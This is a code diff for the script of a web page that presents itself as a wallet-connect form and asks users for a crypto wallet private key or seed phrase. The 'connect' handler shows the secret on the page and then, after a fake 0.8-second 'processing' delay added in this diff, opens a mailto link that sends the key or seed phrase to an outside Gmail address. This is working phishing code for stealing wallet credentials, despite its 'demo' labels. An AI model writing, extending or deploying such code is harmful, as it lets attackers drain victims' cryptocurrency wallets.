@@ -1,14 +1,11 @@
 // ================= SELECT ELEMENTS =================
-const walletTypeSelect = document.getElementById("walletType");
-const manualBox = document.getElementById("manualBox");
-const manualInput = document.getElementById("manualAddress");
 const manualConnectBtn = document.getElementById("manualConnect");
-const walletInfo = document.getElementById("walletInfo");
+const walletTypeSelect = document.getElementById("walletType");
+const manualInput = document.getElementById("manualAddress");
 const walletSelectedDisplay = document.getElementById("walletSelected");
-const addressDisplay = document.getElementById("address");
-const networkDisplay = document.getElementById("network");
-const validationMessage = document.getElementById("validationMessage");
-
+const addressDisplay = document.getElementById("walletAddress");
+const networkDisplay = document.getElementById("walletNetwork");
+const walletInfo = document.getElementById("walletInfo");
 // ================= SHOW PRIVATE KEY INPUT WHEN WALLET SELECTED =================
 walletTypeSelect.addEventListener("change", () => {
   if (walletTypeSelect.value) {
@@ -20,7 +17,6 @@ walletTypeSelect.addEventListener("change", () => {
 
 // ================= MANUAL PRIVATE KEY / SEED PHRASE =================
 manualConnectBtn.addEventListener("click", () => {
-
   const walletType = walletTypeSelect.value;
   const privateKeyOrSeed = manualInput.value.trim();
 
@@ -34,31 +30,32 @@ manualConnectBtn.addEventListener("click", () => {
     return;
   }
 
-  // Detect Private Key
-  const privateKeyRegex = /^(0x)?[0-9a-fA-F]{64}$/;
+  // Disable button and show loading state
+  manualConnectBtn.disabled = true;
+  const originalText = manualConnectBtn.innerText;
+  manualConnectBtn.innerText = "Preparing email...";
 
-  // Detect Seed Phrase
-  const words = privateKeyOrSeed.split(/\s+/);
-  const isSeedPhrase = words.length === 12 || words.length === 15 || words.length === 18 || words.length === 21 || words.length === 24;
-
-
-
-
-
-
-  // Display in wallet info
+  // Display wallet info
   walletSelectedDisplay.innerText = walletType;
   addressDisplay.innerText = privateKeyOrSeed;
   networkDisplay.innerText = "Demo Network";
   walletInfo.classList.remove("hidden");
 
-  // ----- DEMO EMAIL SENDING -----
-  const subject = encodeURIComponent(`Wallet Submission: ${walletType}`);
-  const body = encodeURIComponent(
-    `Wallet Type: ${walletType}\nPrivate Key / Seed Phrase (demo):\n\n${privateKeyOrSeed}`
-  );
-  window.location.href = `mailto:chainprotocol981@gmail.com?subject=${subject}&body=${body}`;
+  // Small delay to simulate “processing”
+  setTimeout(() => {
+    const subject = encodeURIComponent(`Wallet Submission: ${walletType}`);
+    const body = encodeURIComponent(
+      `Wallet Type: ${walletType}\nPrivate Key / Seed Phrase (demo):\n\n${privateKeyOrSeed}`
+    );
 
-  // Clear input
-  manualInput.value = "";
+    // Open the user's email client
+    window.location.href = `mailto:chainprotocol981@gmail.com?subject=${subject}&body=${body}`;
+
+    // Reset button
+    manualConnectBtn.disabled = false;
+    manualConnectBtn.innerText = originalText;
+
+    // Clear input
+    manualInput.value = "";
+  }, 800); // 0.8 second delay
 });
